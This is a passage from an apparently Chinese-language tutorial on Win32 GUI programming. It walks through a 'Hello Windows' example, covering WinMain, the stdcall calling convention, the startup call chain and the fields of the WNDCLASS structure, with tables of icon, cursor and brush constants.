class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,</span></span><br><span class="line"><span class="params">    PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;HelloWin&quot;</span>);</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG msg;</span><br><span class="line">    WNDCLASS wndclass;</span><br><span class="line">    wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wndclass.lpfnWndProc = WndProc;</span><br><span class="line">    wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wndclass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    wndclass.hInstance = hInstance;</span><br><span class="line">    wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">    wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</span><br><span class="line">    wndclass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">    wndclass.lpszClassName = szAppName;</span><br><span class="line">    <span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;This program requires Windows NT!&quot;</span>),</span><br><span class="line">            szAppName, MB_ICONERROR);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hwnd = CreateWindow(szAppName,                 <span class="comment">// window class name</span></span><br><span class="line">        TEXT(<span class="string">&quot;The Hello Program&quot;</span>), <span class="comment">// window caption</span></span><br><span class="line">        WS_OVERLAPPEDWINDOW,       <span class="comment">// window style</span></span><br><span class="line">        CW_USEDEFAULT,             <span class="comment">// initial x position</span></span><br><span class="line">        CW_USEDEFAULT,             <span class="comment">// initial y position</span></span><br><span class="line">        CW_USEDEFAULT,             <span class="comment">// initial x size</span></span><br><span class="line">        CW_USEDEFAULT,             <span class="comment">// initial y size</span></span><br><span class="line">        <span class="literal">NULL</span>,                      <span class="comment">// parent window handle</span></span><br><span class="line">        <span class="literal">NULL</span>,                      <span class="comment">// window menu handle</span></span><br><span class="line">        hInstance,                 <span class="comment">// program instance handle</span></span><br><span class="line">        <span class="literal">NULL</span>);                     <span class="comment">// creation parameters</span></span><br><span class="line"></span><br><span class="line">    ShowWindow(hwnd, iCmdShow);</span><br><span class="line">    UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    HDC hdc;</span><br><span class="line">    PAINTSTRUCT ps;</span><br><span class="line">    RECT rect;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">        PlaySound(TEXT(<span class="string">&quot;SenbonZakura.wav&quot;</span>), <span class="literal">NULL</span>, SND_FILENAME | SND_ASYNC);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">        hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">        GetClientRect(hwnd, &amp;rect);</span><br><span class="line"></span><br><span class="line">        DrawText(hdc, TEXT(<span class="string">&quot;Hello, Windows 98!&quot;</span>), <span class="number">-1</span>, &amp;rect,</span><br><span class="line">            DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">        EndPaint(hwnd, &amp;ps);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求:和exe文件同目录下有一个SenbonZakura.wav才能听歌.没有也不至于出错</p>
<p>至于windows系统版本要求,win
xp是可以的,再老一点的win2000应该也可以,但是win98不是狠支持unicode编码,不是很行了</p>
<h3 id="主函数">主函数</h3>
<h4 id="接口定义">接口定义</h4>
<p>WinMain函数,其固定格式:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INT WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,</span></span><br><span class="line"><span class="params">    PSTR lpCmdLine, INT nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回值为<code>INT</code>,在<code>minwindef.h</code>中有<code>typedef int         INT;</code></p>
<p>调用约定为<code>WINAPI</code>在<code>minwindef.h</code>中有:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CALLBACK    __stdcall</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WINAPI      __stdcall</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WINAPIV     __cdecl</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APIENTRY    WINAPI</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APIPRIVATE  __stdcall</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASCAL      __stdcall</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于stdcall调用约定:</p>
<table>
<colgroup>
<col style="width: 32%" />
<col style="width: 67%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Element</th>
<th style="text-align: left;">Implementation</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">参数传递顺序</td>
<td style="text-align: left;">从右向左压栈,不使用寄存器</td>
</tr>
<tr>
<td style="text-align: left;">参数传递规则(值传递/引用传递)</td>
<td
style="text-align: left;">除非参数是指针或者引用类型,否则采用值传递</td>
</tr>
<tr>
<td style="text-align: left;">栈维护</td>
<td style="text-align: left;">被调用者自己清理自己用到的栈</td>
</tr>
<tr>
<td style="text-align: left;">命名修饰规则</td>
<td
style="text-align: left;">下划线开头,然后@,然后是十进制表示的参数表字节大小.
因此<code>int func(int a,double b)</code>将会被修饰为<code>_func@12</code>(int四个字节+double八个字节)</td>
</tr>
<tr>
<td style="text-align: left;">大小写转换规定</td>
<td style="text-align: left;">无</td>
</tr>
<tr>
<td style="text-align: left;">返回值位置</td>
<td style="text-align: left;">放在eax,rax寄存器中</td>
</tr>
</tbody>
</table>
</blockquote>
<p>四个参数:</p>
<p><code>HINSTANCE hInstance</code>:句柄类型,实例句柄或者模块句柄.实际上是一个数,但是可以唯一地标识某些东西.例程中的hInstance就标识本程序自己.</p>
<blockquote>
<p>句柄类似于文件描述符,用一个数字对应一个打开的文件</p>
</blockquote>
<p><code>HINSTANCE hPrevInstance</code>:本程序前一个打开的实例的句柄.如果a.exe已经有一个实例在运行了,那么此时再打开a.exe,则hPrevInstance就是刚才实例的句柄.32位windows中该参数已经弃用</p>
<p><code>PSTR lpCmdLine</code>:用来运行程序的命令行</p>
<blockquote>
<p>PSTR是个什么类型呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> CHAR;</span><br><span class="line"><span class="keyword">typedef</span> _Null_terminated_ CHAR *NPSTR, *LPSTR, *PSTR;</span><br></pre></td></tr></table></figure>
<p>原来是以NULL结尾的char*字符串</p>
</blockquote>
<p><code>INT nCmdShow</code>:指明程序最初如何显示,包括最大化,最小化,正常显示</p>
<h4 id="调用链">调用链</h4>
<p>关于入口点的问题还需要炎鸠,暂且这样认为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinMainCRTStartup或mainCRTStartup</span><br><span class="line">	-&gt;__tmainCRTStartup</span><br><span class="line">		-&gt;main</span><br><span class="line">			-&gt;WinMai</span><br></pre></td></tr></table></figure>
<p>用ida观察最开始貌似有两个入口,但是实际上是不同类型的exe的进入点不一样</p>
<blockquote>
<p>mainCRTStartup() ANSI + 控制台程序 wmainCRTStartup() UNICODE +
控制台程序 WinMainCRTStartup() ANSI + GUI程序 wWinMainCRTStartup()
UNICODE + GUI程序</p>
</blockquote>
<p>然后<code>__tmainCRTStartup</code>这个函数,</p>
<p>使用<code>GetStartupInfo</code>获取进程启动信息，</p>
<p>然后使用<code>_inititem</code>初始化全局变量和对象，</p>
<p>最后调用main、wmain、WinMain、wWinMain进入程序</p>
<h3 id="注册窗口类">注册窗口类</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HWND hwnd;</span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wndclass.lpfnWndProc = WndProc;</span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.lpszClassName = szAppName;</span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;This program requires Windows NT!&quot;</span>),</span><br><span class="line">        szAppName, MB_ICONERROR);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="wndclass-wndclass">WNDCLASS wndclass</h4>
<p>窗口类(实际上是一个C结构体配合面向对象风格的函数使用罢了),创建应用程序窗口之前必须注册窗口类</p>
<p>这个类的成员都有啥呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagWNDCLASSW</span> &#123;</span></span><br><span class="line">    UINT        style;</span><br><span class="line">    WNDPROC     lpfnWndProc;</span><br><span class="line">    <span class="type">int</span>         cbClsExtra;</span><br><span class="line">    <span class="type">int</span>         cbWndExtra;</span><br><span class="line">    HINSTANCE   hInstance;</span><br><span class="line">    HICON       hIcon;</span><br><span class="line">    HCURSOR     hCursor;</span><br><span class="line">    HBRUSH      hbrBackground;</span><br><span class="line">    LPCWSTR     lpszMenuName;</span><br><span class="line">    LPCWSTR     lpszClassName;</span><br><span class="line">&#125; WNDCLASSW, *PWNDCLASSW, NEAR *NPWNDCLASSW, FAR *LPWNDCLASSW;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="keyword">typedef</span> WNDCLASSW WNDCLASS;</span><br></pre></td></tr></table></figure>
<p>其中最重要的是lpfnWndProc回调函数,lpszClassName窗口类名</p>
<h5 id="style">style</h5>
<p>UINT,unsigned int,无符号32位整型</p>
<p>窗口类样式.枚举类型</p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 66%" />
</colgroup>
<thead>
<tr>
<th>取值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>CS_BYTEALIGNCLIENT<br />0x1000</td>
<td>窗口的客户区域以“字符边界”对齐，当系统调整窗口的水平位置时，客户区域的左边坐标是8的整数倍。</td>
</tr>
<tr>
<td>CS_BYTEALIGNWINDOW<br />0x2000</td>
<td>窗口以“字符边界”对齐，当系统调整窗口的水平位置时，客户区域的左边坐标是8的整数倍。</td>
</tr>
<tr>
<td>CS_CLASSDC<br />0x0040</td>
<td>分配一个设备环境并被类中的所有窗体共享。它是可以适用于一个应用程序的若干线程创建的一个相同类的窗体。当多个线程试图同时使用相同的设备环境时，系统只允许一个线程成功地进行绘图操作。</td>
</tr>
<tr>
<td>CS_DBLCLKS<br />0x0008</td>
<td>当用户双击窗口时，将向窗口函数发送鼠标双击消息。</td>
</tr>
<tr>
<td>CS_GLOBALCLASS<br />0x4000</td>
<td>指定此窗体类是一个应用程序全局类。应用程序全局类是由一个在进程中对所有模块有效的exe或dll注册的窗体类。</td>
</tr>
<tr>
<td>CS_HREDRAW<br />0x0002</td>
<td>如果窗口的位置或宽度发生改变，将重绘窗口。</td>
</tr>
<tr>
<td>CS_NOCLOSE<br />0x0200</td>
<td>窗口中的“关闭”按钮不可见。</td>
</tr>
<tr>
<td>CS_OWNDC<br />0x0020</td>
<td>为同一个窗口类中的每个窗口创建一个唯一的设备上下文。</td>
</tr>
<tr>
<td>CS_PARENTDC<br />0x0080</td>
<td>设置子窗口中剪下的矩形区域到父窗口中，以使子窗口可以在父窗口上绘图。指定该风格可以提高应用程序的性能</td>
</tr>
<tr>
<td>CS_SAVEBITS<br />0x0800</td>
<td>把被窗口遮掩的屏幕图像作为位图保存起来。当该窗口被移动时，Windows操作系统使用被保存的位图来重建屏幕图像。</td>
</tr>
<tr>
<td>CS_VREDRAW<br />0x0001</td>
<td>如果窗口的位置或高度改变，将重绘窗口。</td>
</tr>
</tbody>
</table>
<p>多个样式时使用按位或</p>
<h5 id="lpfnwndproc">lpfnWndProc</h5>
<p>窗口信息的回调处理函数,窗口的灵魂</p>
<p>其类型是一个函数指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> __int64 LONG_PTR, *PLONG_PTR;</span><br><span class="line"><span class="keyword">typedef</span> LONG_PTR            LRESULT;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALLBACK    __stdcall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> __int64 UINT_PTR, *PUINT_PTR;</span><br><span class="line"><span class="keyword">typedef</span> UINT_PTR            WPARAM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 LONG_PTR, *PLONG_PTR;</span><br><span class="line"><span class="keyword">typedef</span> LONG_PTR            LPARAM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(CALLBACK* WNDPROC)</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;</span><br></pre></td></tr></table></figure>
<p>一个返回值为<code>LRESULT</code>(64位整数),调用约定位<code>CALLBACK(__stdcall)</code>,</p>
<p>四个参数分别为句柄,无符号32位整型,无符号64位整型,带符号64位整型</p>
<p>的函数指针<code>WNDPROC</code></p>
<p>在例程中,它被注册为<code>wndclass.lpfnWndProc = WndProc;</code></p>
<p>该函数就是过程函数,决定了收到特定消息时窗口的行为</p>
<h5 id="cbclsextra">cbClsExtra</h5>
<p>根据匈牙利命名法,cb,count bytes,表示字节数前缀.</p>
<blockquote>
<p>windows程序为每一个窗口设计类管理一个WNDCLASS结构。在应用程序注册一个窗口类的时候，可以让windows分配一定字节空间的内存，这部分内存成为类的附件内存，有属于这个窗口类的所有窗口共享，类附件内存信息用于存储窗口类的附加信息。windows系统将这部分内存初始化为0，因此我们经常设置此参数为0.</p>
</blockquote>
<p>例程中该值设置为0,看来不是必要的</p>
<h5 id="cbwndextra">cbWndExtra</h5>
<blockquote>
<p>windows程序为每一个窗口管理一个内部数据结构，在注册窗口类的时候，系统可以为每一个窗口分配一定的字节数的附加内存空间，称为窗口附件内存。应用程序可使用这部分内存存储窗口特有的数据，windows系统把这部分内存初始化为0.</p>
</blockquote>
<p>例程中该值设置为0,看来不是必要的</p>
<h5 id="hinstance">hInstance</h5>
<p>窗体所在句柄</p>
<p>在例程中是这样写的<code>wndclass.hInstance = hInstance;</code></p>
<p>右值的hInstance来自WinMain的第一个参数hInstacne,也就是当前程序的句柄</p>
<h5 id="hicon">hIcon</h5>
<p>窗体图标的句柄</p>
<p>例程中<code>wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);</code></p>
<p>调用了一个函数LoadIcon</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI HICON WINAPI <span class="title function_">LoadIconW</span></span><br><span class="line">    <span class="params">(_In_opt_ HINSTANCE hInstance,_In_ LPCWSTR lpIconName)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LoadIcon  LoadIconW</span></span><br></pre></td></tr></table></figure>
<p><code>hInstance</code>:模块实例句柄,该模块包含了将被加载的图标</p>
<p><code>lpIconName:</code>被家长的图标资源的名称</p>
<p>如果使用系统图标则<code>hInstance</code>为NULL,lpIconName为宏定义值</p>
<table>
<colgroup>
<col style="width: 48%" />
<col style="width: 51%" />
</colgroup>
<thead>
<tr>
<th>Value</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>IDI_APPLICATION MAKEINTRESOURCE(32512)</td>
<td>默认程序图标</td>
</tr>
<tr>
<td>IDI_ASTERISK MAKEINTRESOURCE(32516)</td>
<td>Asterisk图标， 与IDI_INFORMATION相同</td>
</tr>
<tr>
<td>IDI_ERROR MAKEINTRESOURCE(32513)</td>
<td>Hand-shaped图标</td>
</tr>
<tr>
<td>IDI_EXCLAMATION MAKEINTRESOURCE(32515)</td>
<td>感叹号图标， 与IDI_WARNING相同</td>
</tr>
<tr>
<td>IDI_HAND MAKEINTRESOURCE(32513)</td>
<td>Hand-shaped图标， 与IDI_ERROR相同</td>
</tr>
<tr>
<td>IDI_INFORMATION MAKEINTRESOURCE(32516)</td>
<td>Asterisk图标</td>
</tr>
<tr>
<td>IDI_QUESTION MAKEINTRESOURCE(32514)</td>
<td>疑问号图标</td>
</tr>
<tr>
<td>IDI_SHIELD MAKEINTRESOURCE(32518)</td>
<td>安全盾图标</td>
</tr>
<tr>
<td>IDI_WARNING MAKEINTRESOURCE(32515)</td>
<td>感叹号图标</td>
</tr>
<tr>
<td>IDI_WINLOGO MAKEINTRESOURCE(32517)</td>
<td>默认程序图标， Win2000：Windows logo图标</td>
</tr>
</tbody>
</table>
<p>例程中就使用了系统图标<code>IDI_APPLICATION</code>即默认图标(最丑的白板)</p>
<p>给他改成安全盾</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220713161727581.png"
alt="image-20220713161727581" />
<figcaption aria-hidden="true">image-20220713161727581</figcaption>
</figure>
<p>函数返回值为<code>HICON</code>即新加载的图标的句柄,如果加载失败则返回NULL</p>
<h5 id="hcursor">hCursor</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HCURSOR</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">LoadCursorW</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_ HINSTANCE hInstance,</span></span><br><span class="line"><span class="params">    _In_ LPCWSTR lpCursorName)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LoadCursor  LoadCursorW</span></span><br></pre></td></tr></table></figure>
<p>光标类句柄</p>
<p>使用方法类似于hIcon,当hInstance=NULL时通过lpCursorName指定一个枚举值,使用系统光标</p>
<table>
<colgroup>
<col style="width: 22%" />
<col style="width: 32%" />
<col style="width: 44%" />
</colgroup>
<thead>
<tr>
<th>宏名</th>
<th>宏值</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>IDC_APPSTARTING</td>
<td>MAKEINTRESOURCE(32650)</td>
<td>标准箭头和沙漏</td>
</tr>
<tr>
<td>IDC_ARROW</td>
<td>MAKEINTRESOURCE(32512)</td>
<td>标准箭头</td>
</tr>
<tr>
<td>IDC_CROSS</td>
<td>MAKEINTRESOURCE(32515)</td>
<td>十字线</td>
</tr>
<tr>
<td>IDC_HAND</td>
<td>MAKEINTRESOURCE(32649)</td>
<td>手掌</td>
</tr>
<tr>
<td>IDC_HELP</td>
<td>MAKEINTRESOURCE(32651)</td>
<td>箭头和问号</td>
</tr>
<tr>
<td>IDC_IBEAM</td>
<td>MAKEINTRESOURCE(32513)</td>
<td>I型</td>
</tr>
<tr>
<td>IDC_ICON</td>
<td>MAKEINTRESOURCE(32641)</td>
<td>已过时</td>
</tr>
<tr>
<td>IDC_NO</td>
<td>MAKEINTRESOURCE(32648</td>
<td>禁止圈</td>
</tr>
<tr>
<td>IDC_SIZE</td>
<td>MAKEINTRESOURCE(32640)</td>
<td>已过时，应该用IDC_SIZEALL</td>
</tr>
<tr>
<td>IDC_SIZEALL</td>
<td>MAKEINTRESOURCE(32646)</td>
<td>指向东、西、南、北的四方向箭头</td>
</tr>
<tr>
<td>IDC_SIZENESW</td>
<td>MAKEINTRESOURCE(32643)</td>
<td>指向东南、西北的两方向箭头</td>
</tr>
<tr>
<td>IDC_SIZENS</td>
<td>MAKEINTRESOURCE(32645)</td>
<td>指向南、北的两方向箭头</td>
</tr>
<tr>
<td>IDC_SIZENWSE</td>
<td>MAKEINTRESOURCE(32642)</td>
<td>指向西北、东南的两方向箭头</td>
</tr>
<tr>
<td>IDC_SIZEWE</td>
<td>MAKEINTRESOURCE(32644)</td>
<td>指向东西的两方向箭头</td>
</tr>
<tr>
<td>IDC_UPARROW</td>
<td>MAKEINTRESOURCE(32516)</td>
<td>竖直箭头</td>
</tr>
<tr>
<td>IDC_WAIT</td>
<td>MAKEINTRESOURCE(32514)</td>
<td>沙漏</td>
</tr>
</tbody>
</table>
<p>返回值HCURSOR类型的句柄.如果成功，返回最近一次加载的光标句柄。如果失败，返回NULL。</p>
<p>例程中使用的是<code>IDC_ARROW</code>标准箭头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220713162947891.png"
alt="image-20220713162947891" />
<figcaption aria-hidden="true">image-20220713162947891</figcaption>
</figure>
<h5 id="hbrbackground">hbrBackground</h5>
<p>主窗口背景色,背景刷类的句柄</p>
<p>该值可以是一个物理刷,也可以是纯颜色值</p>
<blockquote>
<ul>
<li>COLOR_ACTIVEBORDER</li>
<li>COLOR_ACTIVECAPTION</li>
<li>COLOR_APPWORKSPACE</li>
<li>COLOR_BACKGROUND</li>
<li>COLOR_BTNFACE</li>
<li>COLOR_BTNSHADOW</li>
<li>COLOR_BTNTEXT</li>
<li>COLOR_CAPTIONTEXT</li>
<li>COLOR_GRAYTEXT</li>
<li>COLOR_HIGHLIGHT</li>
<li>COLOR_HIGHLIGHTTEXT</li>
<li>COLOR_INACTIVEBORDER</li>
<li>COLOR_INACTIVECAPTION</li>
<li>COLOR_MENU</li>
<li>COLOR_MENUTEXT</li>
<li>COLOR_SCROLLBAR</li>
<li>COLOR_WINDOW</li>
<li>COLOR_WINDOWFRAME</li>
<li>COLOR_WINDOWTEXT</li>
</ul>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220713163735682.png"
alt="image-20220713163735682" />
<figcaption aria-hidden="true">image-20220713163735682</figcaption>
</figure>
<p>例程中使用的是物理刷<code>(HBRUSH)GetStockObject(WHITE_BRUSH)</code></p>
<p>其中GetStockObject函数原型:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HGDIOBJ <span class="title function_">GetStockObject</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> i</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>参数i的取值有:</p>
<table>
<colgroup>
<col style="width: 24%" />
<col style="width: 75%" />
</colgroup>
<thead>
<tr>
<th><strong>值</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BLACK_BRUSH</td>
<td>黑色画刷</td>
</tr>
<tr>
<td>DKGRAY_BRUSH</td>
<td>暗灰色画刷</td>
</tr>
<tr>
<td>DC_BRUSH</td>
<td>1. 纯色画刷，默认颜色是白色的 2. 调用 <a
target="_blank" rel="noopener" href="http://bbs.fishc.com/thread-54634-1-1.html">SetDCBrushColor</a>
函数可以修改该值的颜色</td>
</tr>
<tr>
<td>GRAY_BRUSH</td>
<td>灰色画刷</td>
</tr>
<tr>
<td>HOLLOW_BRUSH</td>
<td>空画刷（相当于 NULL_BRUSH）</td>
</tr>
<tr>
<td>LTGRAY_BRUSH</td>
<td>浅灰色画刷</td>
</tr>
<tr>
<td>NULL_BRUSH</td>
<td>空画刷（相当于 HOLLOW_BRUSH）</td>
</tr>
<tr>
<td>WHITE_BRUSH</td>
<td>白色画刷</td>
</tr>
<tr>
<td>BLACK_PEN</td>
<td>黑色画笔</td>
</tr>
<tr>
<td>DC_PEN</td>
<td>1. 纯色画笔，默认颜色是白色的 2. 调用 <a
target="_blank" rel="noopener" href="http://bbs.fishc.com/thread-54635-1-1.html">SetDCPenColor</a>
函数可以修改该值的颜色</td>
</tr>
<tr>
<td>NULL_PEN</td>
<td>空画笔（空画笔不绘制任何东西）</td>
</tr>
<tr>
<td>WHITE_PEN</td>
<td>白色画笔</td>
</tr>
<tr>
<td>ANSI_FIXED_FONT</td>
<td>Windows 中的固定间距（等宽）系统字体</td>
</tr>
<tr>
<td>ANSI_VAR_FONT</td>
<td>Windows 中的可变间距（比例间距）系统字体</td>
</tr>
<tr>
<td>DEVICE_DEFAULT_FONT</td>
<td>设备相关字体</td>
</tr>
<tr>
<td>DEFAULT_GUI_FONT</td>
<td>1. 用户界面对象（如菜单、对话框）的默认字体 2. 不推荐使用
DEFAULT_GUI_FONT 或 SYSTEM_FONT 获得对话框或系统的字体 3. 该字体默认是
Tahoma</td>
</tr>
<tr>
<td>OEM_FIXED_FONT</td>
<td>原始设备制造商（OEM）相关固定间距（等宽）字体</td>
</tr>
<tr>
<td>SYSTEM_FONT</td>
<td>1. 系统字体 2. 默认情况下，Windows
使用系统字体绘制菜单，对话框和文本 3. 不推荐使用 DEFAULT_GUI_FONT 或
SYSTEM_FONT 获得对话框或系统的字体 4. 该字体默认是 Tahoma</td>
</tr>
<tr>
<td>SYSTEM_FIXED_FONT</td>
<td>1. 固定间距（等宽）系统字体 2. 该对象仅为兼容 16 位 Windows
版本提供</td>
</tr>
<tr>
<td>DEFAULT_PALETTE</td>
<td>默认调色板（该调色板由系统调色板中的静态色彩组成）</td>
</tr>
</tbody>
</table>
<p>函数调用成功则返回所申请的逻辑对象的句柄</p>
<p>失败则返回NULL</p>
<h5 id="lpszmenuname">lpszMenuName</h5>
